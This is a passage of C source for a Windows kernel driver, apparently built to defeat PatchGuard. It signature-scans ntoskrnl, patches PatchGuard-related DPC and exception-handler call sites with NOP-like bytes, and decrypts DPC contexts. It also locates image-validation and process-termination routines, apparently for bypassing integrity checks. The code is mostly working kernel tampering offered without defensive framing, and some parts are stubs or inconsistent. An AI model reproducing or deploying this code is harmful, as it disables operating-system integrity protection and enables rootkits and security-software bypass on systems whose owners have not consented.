		PsActiveProcessHead = (PLIST_ENTRY)KdDebuggerDataBlock->PsActiveProcessHead;
		//KdDebuggerDataBlock.

		KLDR_DATA_TABLE_ENTRY* KernelDataTableEntry = CONTAINING_RECORD(
			PsLoadedModuleList->Flink,
			KLDR_DATA_TABLE_ENTRY,
			InLoadOrderLinks);


		ExFreePoolWithTag(DumpHeader, 'tag');





		OBJECT_ATTRIBUTES ObjectAttributes;

		InitializeObjectAttributes(
			&ObjectAttributes,
			&KernelDataTableEntry->FullDllName,
			(OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE),
			NULL,
			NULL);


		LOG_DEBUG("%ws\n", KernelDataTableEntry->FullDllName.Buffer);
		//LOG_DEBUG("%ws\n", KernelDataTableEntry->FullDllName.Buffer);


		MOD_SECTION ModSection = { 0 };

		NTSTATUS Status = ZqLoadModSection(&KernelDataTableEntry->FullDllName, &ModSection);
		if (NT_SUCCESS(Status)){
			_Find_Memory_Section(ModSection.ViewBase);
			ZqUnLoadModSection(&ModSection);
		}

		

		//HANDLE FileHandle = 0;
		//HANDLE SectionHandle = 0;
		//PVOID ViewBase = NULL;
		//ULONGLONG ViewSize = 0;
		//IO_STATUS_BLOCK IoStatusBlock = { 0 };

		//NTSTATUS Status = ZwOpenFile(
		//	&FileHandle,
		//	FILE_EXECUTE,
		//	&ObjectAttributes,
		//	&IoStatusBlock,
		//	FILE_SHARE_READ | FILE_SHARE_DELETE,
		//	0);

		//if (NT_SUCCESS(Status)) {
		//	InitializeObjectAttributes(
		//		&ObjectAttributes,
		//		NULL,
		//		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
		//		NULL,
		//		NULL);

		//	Status = ZwCreateSection(
		//		&SectionHandle,
		//		SECTION_MAP_READ | SECTION_MAP_EXECUTE,
		//		&ObjectAttributes,
		//		NULL,
		//		PAGE_EXECUTE,
		//		SEC_IMAGE,
		//		FileHandle);

		//	if (NT_SUCCESS(Status)) {
		//		Status = ZwMapViewOfSection(
		//			SectionHandle,
		//			ZwCurrentProcess(),
		//			&ViewBase,
		//			0L,
		//			0L,
		//			NULL,
		//			&ViewSize,
		//			ViewShare,
		//			0L,
		//			PAGE_EXECUTE);




		//		ZwClose(SectionHandle);
		//	}
		//	ZwClose(FileHandle);
		//}






		//WORK_PG* pgInfo = (WORK_PG*)Argument;

		/*
cmp     dword ptr ds:[rax], 0x1131482E   //     xor     qword ptr cs:[rcx],rdx
je      ret
cmp     dword ptr ds:[rax], 0x48513148   //     KiDpcDispatch
je      ret
cmp     dword ptr ds:[rax], 0x11111111   //		KiTimerDispatch[0]
jne     ok
cmp     qword ptr ds:[rax+0x4], 0x22222222  //	KiTimerDispatch[1]
jne     ok
cmp     qword ptr ds:[rax+0x8], 0x33333333  //	KiTimerDispatch[2]
jne     ok
ret
jmp     rax
 */





	}
}





PVOID GetModNodePtr(uintptr_t ModBase, LPCSTR pstr, DWORD *pSize ) {

	const PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)(ModBase);
	const PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PUCHAR)(ModBase)+dos_header->
		e_lfanew);
	const USHORT section_size = pNtHeader->FileHeader.NumberOfSections;
	const PIMAGE_SECTION_HEADER sections_array = (PIMAGE_SECTION_HEADER)((PUCHAR)(pNtHeader)+sizeof(
		IMAGE_NT_HEADERS));

	for (auto i = 0; i < section_size; i++) {
		if (_stricmp(sections_array[i].Name, pstr) == 0)
		{
			ULONG64 scan_base = (ULONG64)(ModBase)+sections_array[i].VirtualAddress;
			*pSize = sections_array[i].SizeOfRawData;
			return scan_base;
		}
	}
	return 0;
}




ULONG64 SearchMoudleFromVal(ULONG64 ModBaseAddress) {

	const PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)(ModBaseAddress);
	const PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PUCHAR)(ModBaseAddress)+dos_header->
		e_lfanew);
	const USHORT section_size = pNtHeader->FileHeader.NumberOfSections;
	const PIMAGE_SECTION_HEADER sections_array = (PIMAGE_SECTION_HEADER)((PUCHAR)(pNtHeader)+sizeof(
		IMAGE_NT_HEADERS));









	return 0;
}








BOOLEAN _cmpMemoryNop_one(char* A, char* B, DWORD nSize) {
	for (DWORD i = 0; i < nSize; i++) {

		if ((char)B[i] == (char)0x90)
			continue;
		if (A[i] != B[i])
			return FALSE;
	}
	return TRUE;
}


char* _findMemoryMod_one(char* va, DWORD vaSize, char* val, DWORD nSize) {

	for (DWORD i = 0; i < (vaSize - nSize); i++) {
		if (_cmpMemoryNop_one(va + i, val, nSize)) {
			return va + i;
		}
	}
	return 0;
}


void  Dbug_Trace_RuntimeHandler(PRUNTIME_HANDLER _Handle) 
{
	LOG_DEBUG_08X(_Handle->Number);
	for (size_t i = 0; i < _Handle->Number; i++){
		LOG_DEBUG("%08X %08X %08X %08X\n", _Handle->HandlerTable[i].Begin,
			_Handle->HandlerTable[i].End,
			_Handle->HandlerTable[i].Handler,
			_Handle->HandlerTable[i].Target);
	}
}

//NTSTATUS ZqGetRunTimeUnwindHandler(PMOD_INFO Mod, PRUNTIME_FUNCTION pRuntime,
//	_Outptr_ PRUNTIME_HANDLER* pRunHandler) {
//
//	PUNWIND_INFO_HDR pHDR = (PUNWIND_INFO_HDR)(Mod->ModBase + pRuntime->UnwindData);
//	if ((pHDR->Flags & UNW_FLAG_EHANDLER) == 0) {
//		if ((pHDR->Flags & UNW_FLAG_CHAININFO) == 0)
//			return STATUS_NOT_FOUND;
//		PRUNTIME_FUNCTION pRunNow = (ULONG64)pHDR + 4;
//		pHDR = (PUNWIND_INFO_HDR)(Mod->ModBase + pRunNow->UnwindData);
//	}
//
//	DWORD Lenth = pHDR->CntUnwindCodes * sizeof(UNWIND_CODE);
//	DWORD offset = (Lenth / 4) * 4;
//	if ((Lenth % 4) != 0)
//		offset += 4;
//	PRUNTIME_HANDLER  _Handler = (PRUNTIME_HANDLER)((DWORD64)pHDR + offset + sizeof(UNWIND_INFO_HDR));
//	*pRunHandler = _Handler;
//	return STATUS_SUCCESS;
//}

//NTSTATUS ZqGetRunTimeUnwindHandler_Debug(PMOD_INFO Mod, PRUNTIME_FUNCTION pRuntime,
//	_Outptr_ PRUNTIME_HANDLER* pRunHandler) {
//
//
//	PUNWIND_INFO_HDR pHDR = (PUNWIND_INFO_HDR)(Mod->ModBase + pRuntime->UnwindData);
//	BOOLEAN bTwoF = 0;
//	if ((pHDR->Flags & UNW_FLAG_EHANDLER) == 0) {
//		if ((pHDR->Flags & UNW_FLAG_CHAININFO) == 0)
//			return STATUS_NOT_FOUND;
//		ULONG LenthV = pHDR->CntUnwindCodes * sizeof(UNWIND_CODE);
//		ULONG offsetV = (LenthV / 4) * 4;
//		if ((LenthV % 4) != 0)
//			offsetV += 4;
//		PRUNTIME_FUNCTION pRunNow = (ULONG64)pHDR + 4 + offsetV;
//		PUNWIND_INFO_HDR Tolf = (PUNWIND_INFO_HDR)(Mod->ModBase + pRunNow->UnwindData);
//		pHDR = Tolf;
//		bTwoF = TRUE;
//	}
//	if (!MmIsAddressValid(pHDR))
//	{
//		return STATUS_NOT_FOUND;
//	}
//
//	ULONG Lenth = pHDR->CntUnwindCodes * sizeof(UNWIND_CODE);
//	
//	ULONG offset = (Lenth / 4) * 4;
//	if ((Lenth % 4) != 0)
//		offset += 4;
//	offset += sizeof(UNWIND_INFO_HDR);
//	PRUNTIME_HANDLER  _Handler = (PRUNTIME_HANDLER)((DWORD64)pHDR + offset);
//	*pRunHandler = _Handler;
//	return STATUS_SUCCESS;
//}


extern char* _ASM_GET_CALL_LENTH(char* pAdr, int num, int Lenth);

void Disable_PathGuard_Handler(PVOID kBase) {

	MOD_INFO kModInfo = { 0 };
	if (!NT_SUCCESS(InitializationModInfo(kernelBase, &kModInfo))) {

		LOG_DEBUG(" InitializationModInfo Error\n");
		return STATUS_FILE_CORRUPT_ERROR;
	}

	NTSTATUS status = 0;
	ULONG64 uKiInsertQueueDpc = _CODE_GET_REAL_ADDRESS_0(_ASM_GET_CALL_LENTH(KeInsertQueueDpc, 1, 0), 1);
	LOG_DEBUG_I64X(uKiInsertQueueDpc);

	status = ZqGetFunctionBlock(&kModInfo, uKiInsertQueueDpc, ArryKiInsertQueueDpcRunTime, 0x20, &pKiInsertQueueDpcCount);
	if (NT_SUCCESS(status))
	{
		//for (size_t i = 0; i < pKiInsertQueueDpcCount; i++) {
		//	LOG_DEBUG("KiInsertQueueDpc BeginAddress<%08X>EndAddress<%08X>UnwindData<%08X>\n",
		//		ArryKiInsertQueueDpcRunTime[i].BeginAddress,
		//		ArryKiInsertQueueDpcRunTime[i].EndAddress,
		//		ArryKiInsertQueueDpcRunTime[i].UnwindData);
		//}
	}

	ULONG64 uKiSetTimerEx = _CODE_GET_REAL_ADDRESS_0(_ASM_GET_CALL_LENTH(KeSetTimer, 1, 0), 1);
	LOG_DEBUG_I64X(uKiSetTimerEx);

	status = ZqGetFunctionBlock(&kModInfo, uKiSetTimerEx, ArryKiSetTimerEx, 0x20, &pKiSetTimerExCount);
	if (NT_SUCCESS(status))
	{
		//for (size_t i = 0; i < pKiSetTimerExCount; i++) {
		//	LOG_DEBUG("KiSetTimerEx BeginAddress<%08X>EndAddress<%08X>UnwindData<%08X>\n",
		//		ArryKiSetTimerEx[i].BeginAddress,
		//		ArryKiSetTimerEx[i].EndAddress,
		//		ArryKiSetTimerEx[i].UnwindData);
		//}
	}

	//-------------------------------------------------------------------
	PVOID ALMOSTROrPtr = 0;
	DWORD rSize = 0;
	status = ZqGetSectionPtr(&kModInfo, "ALMOSTRO", &ALMOSTROrPtr, &rSize);

	LOG_DEBUG_I64X(status);

	LOG_DEBUG_I64X(ALMOSTROrPtr);

	char  _CmpEnableLazyFlushDpcRoutine[] = { 0x48  ,0x8B ,0xC4  ,0x48  ,0x89  ,0x58  ,0x08  ,0x48   ,0x89,
		0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56,0x48,0x81,0xEC,0x90,0x90,0x90,0x90,0x48,0x89 };

	char _KiBalanceSetManagerDeferredRoutine[] = { 0x48 ,0x8B ,0xC4 ,
		  0x48,0x89,0x58,0x08 ,
		  0x48,0x89,0x70,0x18,
		  0x48,0x89,0x78,0x20,
		  0x48,0x89,0x50,0x10,
		  0x41,0x56,
		  0x48,0x81,0xEC,       0x90, 0x90, 0x90, 0x90,
		  0x48,0x89,0xA4,0x24,  0x90, 0x90, 0x90, 0x90,
		  0x4D , 0x8B , 0xF1 ,
		  0x49,  0x8B,  0xF0,  // 这上面一致  // PopThermalZoneDpc
		  0x49,  0x8B,  0xDA };

	//char __fastValSeValidateImageData[] = { 0x48, 0x83,0xEC, 0x48,   //sub     rsp, 48h
	//			 0x48, 0x8B,0x05,0x90,0x90,0x90,0x90, //mov     rax, cs:qword_14040EF48
	//			 0x4C, 0x8B, 0xD1, 0x48, 0x85, 0xC0 }; // mov     r10, rcx   test    rax, rax


//	KiTraceSetTimer
//.text:00000001405240AC; __unwind{ // __GSHandlerCheck
//.text:00000001405240AC                 mov[rsp - 8 + arg_8], rbx
//.text : 00000001405240B1                 mov[rsp - 8 + arg_10], rsi
//.text : 00000001405240B6                 mov[rsp - 8 + arg_18], rdi
//.text : 00000001405240BB                 push    rbp
//.text : 00000001405240BC                 mov     rbp, rsp
//.text : 00000001405240BF                 sub     rsp, 70h
//.text : 00000001405240C3                 mov     rax, cs : __security_cookie
//.text : 00000001405240CA xor rax, rsp
//.text : 00000001405240CD                 mov[rbp + var_10], rax

	char _KiTraceSetTimer[] = { 0x48 ,0x89, 0x5C, 0x24 ,0x90,
	0x48 ,0x89, 0x74, 0x24 ,0x90,
	0x48 ,0x89, 0x7C, 0x24 ,0x90,
	0x55,
	0x48,0x8B,0xEC,
	0x48,0x83,0xEC,0x70,
	0x48,0x8B,0x05,0x90,0x90,0x90,0x90,
	0x48,0x33,0xC4,
	0x48,0x89,0x45,0x90};






	PVOID CmpEnableLazyFlushDpcRoutinePtr = 0;
	RUNTIME_FUNCTION RunTime = { 0 };
	ZqSearchFunction(&kModInfo, _CmpEnableLazyFlushDpcRoutine,
		sizeof(_CmpEnableLazyFlushDpcRoutine), &CmpEnableLazyFlushDpcRoutinePtr, &RunTime);

	

	LOG_DEBUG_I64X(CmpEnableLazyFlushDpcRoutinePtr);
	LOG_DEBUG_08X(RunTime.BeginAddress);
	LOG_DEBUG_08X(RunTime.EndAddress);
	LOG_DEBUG_08X(RunTime.UnwindData);

	PRUNTIME_HANDLER _Handler = 0;
	ZqGetRunTimeUnwindHandler(&kModInfo, &RunTime, &_Handler);



	PVOID KiTraceSetTimerPtr = 0;
	status =  ZqSearchFunction(&kModInfo, _KiTraceSetTimer,
		sizeof(_KiTraceSetTimer), &KiTraceSetTimerPtr, &RunTime);
	if (NT_SUCCESS(status)){
		LOG_DEBUG_I64X(KiTraceSetTimerPtr);
		LOG_DEBUG_08X(RunTime.BeginAddress);
		LOG_DEBUG_08X(RunTime.EndAddress);
		LOG_DEBUG_08X(RunTime.UnwindData);
		status = ZqGetFunctionBlock(&kModInfo, KiTraceSetTimerPtr, ArryKiTraceSetTimer, 0x20, &pKiTraceSetTimerCount);
		if (NT_SUCCESS(status))
		{
			//for (size_t i = 0; i < pKiTraceSetTimerCount; i++) {
			//	LOG_DEBUG("KiTraceSetTimer BeginAddress<%08X>EndAddress<%08X>UnwindData<%08X>\n",
			//		ArryKiTraceSetTimer[i].BeginAddress,
			//		ArryKiTraceSetTimer[i].EndAddress,
			//		ArryKiTraceSetTimer[i].UnwindData);
			//}
		}
	}
	else
	{

		LOG_DEBUG(" can't find KiTraceSetTimer <%08X>\n", status);

	}


	char _ucode[] = { 0x48 ,0x8B ,0x05, 0x90, 0x90, 0x90, 0x90,
		0x48 ,0x33 ,0xD0 ,
		0x8B ,0xC8 ,
		0x48 ,0xD3 ,0xC2 };

	PRUNTIME_FUNCTION pRunTimeMod = 0;
	DWORD dCount = 0;
	status = ZqGetModRunTime(&kModInfo,
		&pRunTimeMod, // 返回的指针
		&dCount); // 返回数量

	if (!NT_SUCCESS(status)) {
		LOG_DEBUG(" ZqGetModRunTime Error<%08X>\n", status);
		return status;
	}


	PVOID pTextCode = 0;
	DWORD TextSize = 0;
	status = ZqGetSectionPtr(&kModInfo, ".text", &pTextCode, &TextSize);

	LOG_DEBUG_08X(status);
	if (pTextCode != 0){
		for (size_t i = 0; i < TextSize - 4; i++) {
			DWORD* pCode = (DWORD *)((ULONG64)pTextCode + i);
			if (*pCode == 0x1131482E){
				LOG_DEBUG_08X((ULONG64)pCode - kernelBase);
			}
		}
	}





	    // .text:00000001405BA1E4                 mov     byte ptr[r10 + 3], 11h         41 C6 42 03 11
		//.text : 00000001405BA1E9                 mov     byte ptr[r10 + 2], 31h; '1'   41 C6 42 02 31
		//.text:00000001405BA1EE                 mov     byte ptr[r10 + 1], 48h; 'H'     41 C6 42 01 48
		//.text:00000001405BA1F3                 mov     byte ptr[r10], 2Eh; '.'         41 C6 02 2E
		//.text:00000001405BA1F7                 call    _guard_dispatch_icall

	char _uSearchPath[] = { 0x41 ,0xC6 ,0x42 ,0x03 ,0x11,
							0x41 ,0xC6 ,0x42 ,0x02 ,0x31,
							0x41 ,0xC6 ,0x42 ,0x01 ,0x48,
							0x41 ,0xC6 ,0x02 ,0x2E };



	ULONG64 _local_unwind_F = GetProcAddress_Kernel(kModInfo.ModBase, "_local_unwind");

	LOG_DEBUG_I64X(_local_unwind_F);






	for (DWORD i = 0; i < dCount; i++) {

		DWORD ufSize = pRunTimeMod[i].EndAddress - pRunTimeMod[i].BeginAddress;

		char* pFunctionBegin = (char*)kModInfo.ModBase + pRunTimeMod[i].BeginAddress;
		
		if (MmIsAddressValid(pFunctionBegin)){

			char* Ptr = _findMemoryMod_one(pFunctionBegin, ufSize, 
				_uSearchPath, sizeof(_uSearchPath));

			if (Ptr != 0){
				LOG_DEBUG_08X(Ptr - kernelBase);
				char _CodeNop[] = { 0x48,0x8B,0xC0,0x8B,0xFF };
				writeSafeMemory(Ptr + sizeof(_uSearchPath), _CodeNop, sizeof(_CodeNop));
				break;
			}
		}
	}

	for (DWORD i = 0; i < dCount; i++) {



		//DWORD ufSize = pRunTimeMod[i].EndAddress - pRunTimeMod[i].BeginAddress;

		//char* Ptr = _findMemoryMod_one((char*)kModInfo.ModBase + pRunTimeMod[i].BeginAddress, ufSize, _uSearchPath, sizeof(_uSearchPath));


		PRUNTIME_HANDLER _Handler = 0;
		status = ZqGetRunTimeUnwindHandler(&kModInfo, &pRunTimeMod[i], &_Handler);
		if (!NT_SUCCESS(status))
			continue;
		if (_Handler->Number >= 0x10)
			continue;
		for (ULONG iNumber = 0; iNumber < _Handler->Number; iNumber++)
		{
			if (_Handler->HandlerTable[iNumber].Handler == 1) {
				continue;
			}
			ULONG64 _EHandler = kModInfo.ModBase + _Handler->HandlerTable[iNumber].Handler;

			if (!MmIsAddressValid(_EHandler))
				continue;

			DWORD _fSize = 0;
			status = ZqGetFunctionSize(&kModInfo, (PVOID)_EHandler, &_fSize);

			if (!NT_SUCCESS(status))
				continue;

			if (!MmIsAddressValid(_EHandler + _fSize))
				continue;

			if (_findMemoryMod_one((char*)_EHandler, _fSize, _ucode, sizeof(_ucode)) != 0) {

				ULONG64 fPtr = kModInfo.ModBase + pRunTimeMod[i].BeginAddress;
				DWORD uTarget = _Handler->HandlerTable[iNumber].Target;

				DWORD iFindCall = 1;

				for (size_t i = 1; i < 4; i++){

					ULONG64 pCode = _ASM_GET_CALL_LENTH(_EHandler, iFindCall, _fSize);
					if (pCode == 0){
						break;
					}
					ULONG64 Address = _CODE_GET_REAL_ADDRESS_0(pCode, 1);
					if (Address != _local_unwind_F) {
						char _CodeNop[] = { 0x48,0x8B,0xC0,0x8B,0xFF };
						writeSafeMemory(pCode, _CodeNop, sizeof(_CodeNop));
						LOG_DEBUG("Path ==0  %d  fPtr <%I64X>  _EHandler<%I64X> _Handler<%I64X> pCode<%08X> <%I64X>\n",
							iNumber, fPtr, _EHandler, _Handler, pCode - kModInfo.ModBase, Address);
					}
					else{
						iFindCall++;
						LOG_DEBUG("Path ==1  %d  fPtr <%I64X>  _EHandler<%I64X> _Handler<%I64X> pCode<%08X> <%I64X>\n",
							iNumber, fPtr, _EHandler, _Handler, pCode - kModInfo.ModBase, Address);
					}
				}
			}








		}
	}	



	LOG_DEBUG("Disable_PathGuard_Handler End\n");

}

VOID Remove_Dpc_Handler() {

	struct _KPRCB* CurrentPrcb = __readgsqword(0x20);//  KeGetCurrentPrcb();
	KDPC_DATA* pDPC_DATA = (KDPC_DATA*)((DWORD64)CurrentPrcb + 0x30C0);

	SINGLE_LIST_ENTRY Head = pDPC_DATA->DpcList.ListHead;
	SINGLE_LIST_ENTRY * Entry = pDPC_DATA->DpcList.ListEntry;


	char* CodeBegin = GetProcAddress_Kernel(kernelBase, "KeSetTimerEx");


	DWORD64* KiWaitNever = _CODE_GET_REAL_ADDRESS_0(_ASM_MOV_RAX_2(CodeBegin, 1), 3);
	DWORD64* KiWaitAlways = _CODE_GET_REAL_ADDRESS_0(_ASM_MOV_RSI_2(CodeBegin, 1), 3);

	LOG_DEBUG("KiWaitNever  %I64X    KiWaitAlways %I64X\n", KiWaitNever, KiWaitAlways);

	if (!KiWaitAlways || !KiWaitAlways)
	{
		//LOG_DEBUG("KiWaitNever  %I64X    KiWaitAlways %I64X  End 01 \n", KiWaitNever, KiWaitAlways);
		return;
	}

	if (!MmIsAddressValid(KiWaitAlways) || !MmIsAddressValid(KiWaitNever))
	{
		//LOG_DEBUG("KiWaitNever  %I64X    KiWaitAlways %I64X  End 02 \n", KiWaitNever, KiWaitAlways);
		return;
	}


	for (SINGLE_LIST_ENTRY* i = pDPC_DATA->DpcList.ListHead.Next; i != Entry; i = i->Next) {

		KDPC* CurDpc = (KDPC*)((DWORD64)i - 8);



		ULONG64 ul_Dpc = (ULONG64)CurDpc->DeferredContext;
		INT i_Shift = (*((PULONG64)KiWaitNever) & 0xFF);

		// 解密 Dpc 对象
		ul_Dpc ^= *((ULONG_PTR*)KiWaitNever);         // 异或
		ul_Dpc = _rotl64(ul_Dpc, i_Shift);      // 循环左移
		ul_Dpc ^= (ULONG_PTR)CurDpc;           // 异或
		ul_Dpc = _byteswap_uint64(ul_Dpc);      // 颠倒顺序
		ul_Dpc ^= *((ULONG_PTR*)KiWaitAlways);        // 异或

		// 对象类型转换
		PKDPC p_DpcDeferredContext = (PKDPC)ul_Dpc;


		LOG_DEBUG_I64X(p_DpcDeferredContext);



	}
	      
	




	







}

int easy_anti_patchguard(uintptr_t search_base)
{

	//STATUS_ABANDON_HIBERFILE

	//Disable_PathGuard_Handler(search_base);


	LOG_DEBUG("easy_anti_patchguard 0   %I64X  Size:%08X\n", search_base, KernelBaseSize);

	const PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)(search_base);
	const PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PUCHAR)(search_base)+dos_header->
		e_lfanew);
	const USHORT section_size = pNtHeader->FileHeader.NumberOfSections;
	const PIMAGE_SECTION_HEADER sections_array = (PIMAGE_SECTION_HEADER)((PUCHAR)(pNtHeader)+sizeof(
		IMAGE_NT_HEADERS));

	void* _guard_icall_handler = 0;

	LOG_DEBUG("easy_anti_patchguard 1\n");


	char* KiFastFailDispatch = 0;


	


	char __fastValSeValidateImageData[] = { 0x48, 0x83,0xEC, 0x48,   //sub     rsp, 48h
						 0x48, 0x8B,0x05,0x90,0x90,0x90,0x90, //mov     rax, cs:qword_14040EF48
						 0x4C, 0x8B, 0xD1, 0x48, 0x85, 0xC0 }; // mov     r10, rcx   test    rax, rax
	                         


	// WIN10 
	//mov     rax, rsp
	//	PAGE : 000000014069C407                 mov[rax + 8], rbx
	//	PAGE : 000000014069C40B                 mov[rax + 10h], rsi
	//	PAGE : 000000014069C40F                 push    rdi
	//	PAGE : 000000014069C410                 sub     rsp, 0A0h
	//	PAGE : 000000014069C417 xor esi, esi
	//	PAGE : 000000014069C419                 mov     rbx, rdx
	// WIN11

	//
	char __fastValSeValidateImageHeader_Win10_17763_19045[] = {0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x57, 0x48, 0x81, 0xEC, 0xA0, 0x00, 0x00, 0x00, 0x33,0xF6, 0x48, 0x8B, 0xDA};

//PAGE:0000000140765DB4                 mov     rax, rsp
//PAGE : 0000000140765DB7                 mov[rax + 8], rbx
//PAGE : 0000000140765DBB                 push    rdi
//PAGE : 0000000140765DBC                 sub     rsp, 0A0h
//PAGE : 0000000140765DC3 and qword ptr[rax - 10h], 0
//PAGE : 0000000140765DC8                 mov     r11, rcx
//PAGE : 0000000140765DCB and dword ptr[rax - 18h], 0

	char __fastValSeValidateImageHeader_Win11[] = {0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x57, 0x48, 0x81, 0xEC, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x83, 0x60, 0xF0, 0x00, 0x4C, 0x8B, 0xD9, 0x83, 0x60, 0xE8, 0x00};


	//char *



	//  38 0D ? ? ? ? 75 02 EB FE

	char __fastVal_PATCHGUARD[] = { 0x38,0x0D , 0x90 , 0x90 , 0x90 , 0x90, 0x75 , 0x02 , 0xEB , 0xFE };

	//char __fastVal_PATCHGUARD_Init[] = { 0x38,0x0D , 0x90 , 0x90 , 0x90 , 0x90, 0x75 , 0x02 , 0xEB , 0xFE };



	char Header_RtlDispatchException[] = { 0x40 , 0x55 , 0x56 , 0x57 , 0x41 , 0x54 , 0x41 , 0x55  ,
		                                   0x41 , 0x56 , 0x41 , 0x57 , 0x48 , 0x81 , 0xEC };


	uRtlDispatchException = _findMemoryV(kernelBase, KernelBaseSize, Header_RtlDispatchException, sizeof(Header_RtlDispatchException));




	LOG_DEBUG("RtlDispatchException<%p> <base+%08X>\n", uRtlDispatchException, uRtlDispatchException - kernelBase);

	for (auto i = 0; i < section_size; i++) {
		//INITKDBG
		//char __fastVal[] = { 0x48, 0xB8,0,0,0,0,0,0x80,0xFF,0xFF, 0xC7 };

		char Name[32] = { 0 };

		RtlCopyMemory(Name, sections_array[i].Name, 8);

		//LOG_DEBUG("F Base Node Name <%s>\n", Name);

		if (_stricmp(sections_array[i].Name, ".pdata") == 0)
		{
			ULONG64 scan_base = (ULONG64)(search_base)+sections_array[i].VirtualAddress;
			LOG_DEBUG(" Virtual pdata <%p>\n", scan_base);
			int scan_size = max(sections_array[i].SizeOfRawData, sections_array[i].Misc.VirtualSize);
			LOG_DEBUG("%d %p\n", __LINE__, sections_array[i].Misc.VirtualSize);
			LOG_DEBUG("%d %p\n", __LINE__, sections_array[i].SizeOfRawData);


			DWORD nSize = sections_array[i].SizeOfRawData;

			int Gz = 0;
			for (DWORD E = 0; E < sections_array[i].Misc.VirtualSize - sizeof(RUNTIME_FUNCTION) * 3; E += sizeof(RUNTIME_FUNCTION))
			{
				PRUNTIME_FUNCTION RunTime_Table =(PRUNTIME_FUNCTION)(scan_base + E);

				if (MmIsAddressValid( (PVOID)(search_base + RunTime_Table->BeginAddress)) &&
					MmIsAddressValid((PVOID)(search_base + RunTime_Table->EndAddress))) {

					if (_guard_icall_handler == 0)
					{
						if (*(DWORD*)(search_base + RunTime_Table->BeginAddress) == 0x28EC8348 &&
							*(DWORD*)(search_base + RunTime_Table->BeginAddress + 9) == 0x000139b9)
						{
							LOG_DEBUG(" [%d]<%p>  <base + %08X>\n", i,
								search_base + RunTime_Table->BeginAddress, RunTime_Table->BeginAddress);
							Gz++;
							if (Gz == 2)
							{
								_guard_icall_handler =  (void *)(search_base + RunTime_Table->BeginAddress);
								//break;
							}
						}
					}
					if (wMiProcessDeleteOnClose == 0)
					{
						if (*(DWORD*)(search_base + RunTime_Table->BeginAddress) == 0x245C8948 &&
							*(DWORD*)(search_base + RunTime_Table->BeginAddress + 0x1E) == 0xFFCD8341)
						{

							wMiProcessDeleteOnClose =  (fMiProcessDeleteOnClose)(search_base + RunTime_Table->BeginAddress);
							LOG_DEBUG("wMiProcessDeleteOnClose <%p>\n", wMiProcessDeleteOnClose);
						}
					}

					//if (RunTime_Table->EndAddress - RunTime_Table->BeginAddress >= 0x48)
					//{
					//	if (*(DWORD*)(search_base + RunTime_Table->BeginAddress) == 0xD8EC8148 &&
					//		*(DWORD*)(search_base + RunTime_Table->BeginAddress + 4) == 0x48000001 &&
					//		*(DWORD*)(search_base + RunTime_Table->BeginAddress + 0x44) == 0x48188948)
					//	{

					//		KiFastFailDispatch = search_base + RunTime_Table->BeginAddress;
					//		uKiFastFailDispatch = KiFastFailDispatch;

					//		LOG_DEBUG("KiFastFailDispatch <%p>\n ", KiFastFailDispatch);
					//		//	KiTimerDispatch[2] = *(uint32_t*)KiFastFailDispatch;
					//			//LOG_DEBUG("find  KiTimerDispatch3 <%08X>\n", KiTimerDispatch[2]);
					//	}
					//}


					//NtTerminateProcess()

					ULONG CodeSize = RunTime_Table->EndAddress - RunTime_Table->BeginAddress;

					if (CodeSize >= 0x28) {
						if (*(DWORD64*)(search_base + RunTime_Table->BeginAddress) == 0x6C894808245C8948 &&
							*(DWORD*)(search_base + RunTime_Table->BeginAddress + 0x23) == 0x890D0FD9)
						{

							//KiFastFailDispatch = search_base + RunTime_Table->BeginAddress;
							//uKiFastFailDispatch = KiFastFailDispatch;
							uPspTerminateProcess = search_base + RunTime_Table->BeginAddress;
							LOG_DEBUG("uPspTerminateProcess <%p>\n", search_base + RunTime_Table->BeginAddress);

							//LOG_DEBUG(" BASE + %08X\n", (ULONGLONG)va - (ULONGLONG)search_base);
							//	KiTimerDispatch[2] = *(uint32_t*)KiFastFailDispatch;
								//LOG_DEBUG("find  KiTimerDispatch3 <%08X>\n", KiTimerDispatch[2]);
						}
					}


					if (CodeSize >= 0x1D)
					{
						if (*(DWORD64*)(search_base + RunTime_Table->BeginAddress) == 0x74894808245c8948 &&
							*(DWORD64*)(search_base + RunTime_Table->BeginAddress + 0x15) == 0x48000000D0EC8148)
						{

							//KiFastFailDispatch = search_base + RunTime_Table->BeginAddress;
							//uKiFastFailDispatch = KiFastFailDispatch;
							uPspUserThreadStartup = search_base + RunTime_Table->BeginAddress;
							LOG_DEBUG("uPspUserThreadStartup <%p>\n", search_base + RunTime_Table->BeginAddress);


							//	KiTimerDispatch[2] = *(uint32_t*)KiFastFailDispatch;
								//LOG_DEBUG("find  KiTimerDispatch3 <%08X>\n", KiTimerDispatch[2]);
						}
					}

					if (CodeSize >= 0x12)
					{

						if (*(DWORD64*)(search_base + RunTime_Table->BeginAddress) == 0x5541544156555340 &&
							*(DWORD64*)(search_base + RunTime_Table->BeginAddress + 0xA) == 0xC03350EC83485741)
						{

							//KiFastFailDispatch = search_base + RunTime_Table->BeginAddress;
							//uKiFastFailDispatch = KiFastFailDispatch;
							uKeTerminateThread = search_base + RunTime_Table->BeginAddress;
							LOG_DEBUG("uKeTerminateThread <%p>\n", search_base + RunTime_Table->BeginAddress);
							LOG_DEBUG(" BASE + %08X\n", RunTime_Table->BeginAddress);

							//	KiTimerDispatch[2] = *(uint32_t*)KiFastFailDispatch;
								//LOG_DEBUG("find  KiTimerDispatch3 <%08X>\n", KiTimerDispatch[2]);
						}

					}
					//if (RunTime_Table->EndAddress - RunTime_Table->BeginAddress >= 0x20)
					//{

					//	char* pAddress = search_base + RunTime_Table->BeginAddress;
					//	if (*(DWORD*)(pAddress) == 0x49DC8B4C)
					//	{

					//		ULONGLONG g = _ASM_AND_EDI_NOW(pAddress, 1);
